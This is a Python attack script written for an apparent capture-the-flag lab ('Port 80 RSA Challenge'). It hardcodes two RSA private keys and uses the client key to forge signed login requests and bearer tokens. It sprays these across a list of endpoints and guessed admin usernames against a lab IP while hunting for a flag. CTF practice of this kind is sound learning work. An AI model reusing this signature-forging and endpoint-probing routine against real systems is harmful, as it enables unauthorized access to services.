#!/usr/bin/env python3
"""
Port 80 RSA Challenge - Hybrid Exploitation
Tests: Signature-based auth, JWT tokens, key-only auth
"""

import base64
import json
import re
import time
from typing import Any

import requests
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15

HOST = "10.81.131.108"
PORT = 80
FLAG_RE = re.compile(r"THM\{[^}]+\}")

SERVER_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/CmDZoFEtP1F+
2VwTxCdyZiLbB4tPQScfBcOwATgD/O9HV1P1fikUis1dWdMqUirxEEyKXKhOfcYd
SAmgUcYZ2pl+cIIfF/QhVfY2GliLUepl5c0KCpjgW0wf1a+NgQfb+3CFSe/KZPx6
AbdznRqlPyxOwmuFaLYz6WFDbJhcZ5xkeAAzsR11q+nJMR0zDXGEh540ejVDE+OK
LX50khTyIgnwXc1C26RN78RDJOMkbHuoPFWhs76eOeet6p2odno+pgP/qOWb2bJe
1S4lCqDExbBvEk25LkDL0lBJEYR/AS6Ake4oS6h8l1ORb8+Jsb0bfNrCzg2GZyjy
vDn2PWttAgMBAAECggEAQ8Mco1TYNmJ1N7dFj8VN8KgFyQceBNipVbmntbBY/CEl
hnqVT0iWrbCmM2x/GE3Y6XTMkW9YS68VLKG2uGUJDXaaZ1zk6r6GW6SwFnS134UI
zWf7mIo1u67mi4wyHtEbxo2jVcPqCDJV07j0J1AceWy0/KK9nK6NolAvrcjBKlUA
F9PIOzwS7tlmoX6tN7X8xKcoTwa+W/2poFZFlsBrWDlrQO0+mnIu/ne/nTlBZHIR
53n4Qg+G7bxs3xKp5DJ9T+K8hd/4iv2zYLBqC1T3WmdNWHD7CDFP4D4GJw9sqoWO
IYxI8GjJn+jWN6pUvSIHu0HFTOpieJl/v+Hc/FSlCQKBgQD4NEFLiu4eo9ZNk4I2
a/x8Ixi/NroDhEqtYutdn7IH+IEol7nTtEKkRrA1Z7FMnYh1/1iRQwms8YIr9KsG
3GeFCGNP8g+9YZ8aXIEU11gML8T+jpN2Y3z7mqRnJIzDeOzPiMYmaopmyKcP7RYS
L+h2fdjYJtxFu8D3C3ZZS4WXkwKBgQDFCnxZWmoT0lZakIBJwUhH4VtYl0FmxioJ
+HpLJyO7vR3V46igmarvU3KW+U7ouoYf2lDcfLWOK3VXpW5FpXzp3WNRe7KA70vQ
QeVTV8vKtIOBfXz5jJNhlm5Dp5iDgfgr4Q+zbR+RjxXLPwc02AbZWyx+q4q1dKmr
zFcdJWzQ/wKBgQCnO6Ym/RPVxzQ0jsf0XSwAhDE/XONWTUN3sae+LERrBHAZ5qkJ
UHJ6dzpwsU4PvjDcuFB3h4C0awD3FuJJPCXvx6gKjKE4S9dEjsFWRoYHqAQGNBB9
eykR6a8N492IMyjz6EcCSVS5Tkbp/yeY13i8pax+byiJP6kTi0CRh8YaSwKBgQCh
fQaM9N0bgbfkYanCyPZEcx46bTzczmyF32/bSCixJT3enscFWOwPWYUA1zMk6joi
wPqkulDSRCvXuW23BvppcViE36xcn8Ky3E7nD32mlGtzJTXYEK55vKCCMkl8/ng2
/i2wEC9fTLW/7dgqJyL14ROGfXEhZovokYCUEqgsYQKBgG4bMelGkTgiGPLc2g7c
TvAc9T7XlUkRqS5ZvoulZuJsJ2BfnDtYjzzVlRU35kDzEBja0Rkv9Rwys+Ft47Md
CEaGB/Nz8hBvA3wQjpLYUW4HXul3j5igRvZ/u8CwW+YDqkMpoCcYqTFJnqDOx8I9
KmaZV/MVPurxIhmwtUrMOjzH
-----END PRIVATE KEY-----"""

CLIENT_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCHFhkwcfgZNVDe
KogLYzQSTTr8wgCi7WNepqeMuTTSXIX22SbzlK/gYlKtPPPxi2JzCkfa9VnTLsTd
3M4ZAL6d0rfo3L0KJ/SKMPq8VnGV9/y5YGyPmgbE1Dy8R2llP0m5GuO4giAoahZX
ePHsPbhNxtQuNW/EiGKcZaz5GQHILEQk2/0ZzqT0e/8jQMljpnbMUoGKe4yhT4JG
QGB7w7wPtQpFhDcASctUO8j3bcOL8tyrPfUcpNKFrkSNY0XT1gqnOuKe29YP0YnC
3bE/m5UPn7atBxP/4FrVRaQvM2S9ta+tZiDU5jP+xU3sBmMLlZByY5KiEeUGkvEz
FjfaMHihAgMBAAECggEAAMiqAvD721dW47Gh7EU+L/Of1afxZ5CeoaXQWcOoutZh
qn5tRHdAv6HJbJb6nESKkMvi0apoG+6g4r/PaDer63v1sEuw2v9jKta8uzlaD5B+
uGOG4LzQSI3J2A625dEImjLlxrAmXC6sqFN3zaboaAbg+/9IUabYEePRBYlhpEv7
jP9IquO6pO3q13gDhot0fS7MM4sTfYKdPfb8qEwYCpsz3Qi7lFdbBqZxz/O/tkPq
giNJNJnHBLmXNOIdSCocMldIhZaPMmcDODPXAehmrru7l/Kh5hnfdK7Njcoph5T4
EJqAPOU7XVSyBeJKiKj1x/S+2jzLn8s3hOKCiBbbwQKBgQC+IvSbRXVA16he1yBE
183VRAALdVRDDTZcFALaexuNfly2SMU9SL/AAFrbNMaQ83y79XtAbDqk8C6YRhyi
z2Il9puVu8G61UB2lWzD5DvDYbb4OS+AroluYZQzeR1+02sZUkR4R0QnfNRQUtMR
3awfBIgf9B6Kr90Dnn/OLmQrYQKBgQC14V2azqz4Nkg4bg1LLk612H2fhwz38Evj
mlMmxAxdIqGJUz+wGb3tSGmGz7fPxmIga9k8n22nMpfZOyyGF9D93LVa+/9NeFEV
DWH5yph+xBN7SSyQMb+Q1xD6gTigLmkIynUXzcucgZB8oUGtexR2IoFu3Li7R9F3
HYpUpsKVQQKBgQCFB3X20TEJbhm6SW+lWwwDY7FYUv3ib/MRl1qrvCh55eg+DUoa
57RpRJZM+m7XadRiuY1DdLXPQtCG778HVmvIPfN7XsNb0eppTYCsyhnaSJq4r2IB
+ZvkI9eJ7/poCsnLDJklQk94BUmS7XAJ9vt/NC99k9JunD7ZUmL/QcwJ4QKBgQCG
a812gJEt0VCHBC8nBU5+70XJBVL8W8h6qrAR0osguluQ1soXKK9KE16KmDJNiV00
gQDI4Tt1etrnXeiGIkv/k4Mlf2EsrGOgn4dtyeHyro+HaolY+KuQLKMLwT1MhYBz
Us4/jYWSYd+bfMLBqFlzBgWLHe4Z2/ZfhqGZ9rWRAQKBgGX7uHz9nUaldXxt4lBn
94FR8D6FJxyKGr0/35XrPE3gc1nDJIQGl62E9vk8eVuBsFgqhm2ISroRSxeRI6ml
djzuBNJ/gQ5hxhj7ifv1ZakiwvxR2D5uJBPU5gve19Fyrq5On6R+KvVR4b+vcZ5A
0HuYuUaGZhtLd9ouH49CvSXj
-----END PRIVATE KEY-----"""

def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")

def extract_flag(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None

def rsa_sign(data: bytes, priv_key: RSA.RsaKey) -> bytes:
    """Sign data with RSA private key (SHA256)."""
    digest = SHA256.new(data)
    return pkcs1_15.new(priv_key).sign(digest)

def scenario_1_key_only():
    """Scenario 1: Key-only authentication (no username)."""
    print("\n[*] SCENARIO 1: Key-Only Authentication")
    print("    Signing requests without username parameter\n")
    
    client_priv = RSA.import_key(CLIENT_PRIVATE_KEY_PEM)
    
    endpoints = ["/", "/authenticate", "/api/authenticate", "/challenge", "/flag"]
    
    for endpoint in endpoints:
        url = f"http://{HOST}:{PORT}{endpoint}"
        
        # Try: Sign a minimal payload with client private key
        data_to_sign = b"authenticate=1"
        signature = rsa_sign(data_to_sign, client_priv)
        
        payload = {
            "data": b64(data_to_sign),
            "signature": b64(signature),
        }
        
        try:
            resp = requests.post(url, json=payload, timeout=5)
            print(f"[+] POST {endpoint} -> HTTP {resp.status_code}")
            flag = extract_flag(resp.text)
            if flag:
                print(f"    [FLAG FOUND]: {flag}")
                return True
            if 200 <= resp.status_code < 300:
                print(f"    Response: {resp.text[:200]}")
        except Exception as e:
            print(f"[-] POST {endpoint} -> Error: {str(e)[:50]}")
    
    return False

def scenario_2_username_keys():
    """Scenario 2: Username + RSA signature."""
    print("\n[*] SCENARIO 2: Username + RSA Signature")
    print("    Using username + signed payload\n")
    
    client_priv = RSA.import_key(CLIENT_PRIVATE_KEY_PEM)
    
    endpoints = ["/", "/authenticate", "/api/authenticate", "/challenge"]
    usernames = ["admin", "ecorp_admin", "user", "client"]
    
    for endpoint in endpoints:
        for username in usernames:
            url = f"http://{HOST}:{PORT}{endpoint}"
            
            # Payload: username=X, signed with client private key
            data_to_sign = f"username={username}".encode()
            signature = rsa_sign(data_to_sign, client_priv)
            
            payload = {
                "username": username,
                "signature": b64(signature),
                "data": b64(data_to_sign),
            }
            
            try:
                resp = requests.post(url, json=payload, timeout=5)
                if resp.status_code == 200:
                    print(f"[+] POST {endpoint} (user={username}) -> HTTP 200")
                    flag = extract_flag(resp.text)
                    if flag:
                        print(f"    [FLAG FOUND]: {flag}")
                        return True
                    print(f"    Response: {resp.text[:200]}")
                elif resp.status_code != 404:
                    print(f"[*] POST {endpoint} (user={username}) -> HTTP {resp.status_code}")
            except Exception:
                pass
    
    return False

def scenario_3_get_bearer():
    """Scenario 3: GET-based with Bearer token in Authorization header."""
    print("\n[*] SCENARIO 3: GET with Bearer Token")
    print("    Using Authorization: Bearer <jwt/token>\n")
    
    client_priv = RSA.import_key(CLIENT_PRIVATE_KEY_PEM)
    
    endpoints = ["/", "/authenticate", "/api/authenticate", "/challenge", "/flag", "/admin"]
    
    for endpoint in endpoints:
        url = f"http://{HOST}:{PORT}{endpoint}"
        
        # Try: Simple JWT-like token (base64 of signed payload)
        payload_data = b'{"user":"admin","action":"authenticate"}'
        signature = rsa_sign(payload_data, client_priv)
        token = f"{b64(payload_data)}.{b64(signature)}"
        
        headers = {"Authorization": f"Bearer {token}"}
        
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                print(f"[+] GET {endpoint} (Bearer) -> HTTP 200")
                flag = extract_flag(resp.text)
                if flag:
                    print(f"    [FLAG FOUND]: {flag}")
                    return True
                print(f"    Response: {resp.text[:200]}")
            elif resp.status_code != 404:
                print(f"[*] GET {endpoint} (Bearer) -> HTTP {resp.status_code}")
        except Exception as e:
            print(f"[-] GET {endpoint} -> Error: {str(e)[:30]}")
    
    return False

def main():
    print(f"[*] Target: http://{HOST}:{PORT}")
    print("[*] Testing 3 scenarios for Port 80 RSA Challenge")
    
    if scenario_1_key_only():
        return
    if scenario_2_username_keys():
        return
    if scenario_3_get_bearer():
        return
    
    print("\n[!] No flags found in any scenario.")
    print("[*] Try manual endpoint discovery...")

if __name__ == "__main__":
    main()
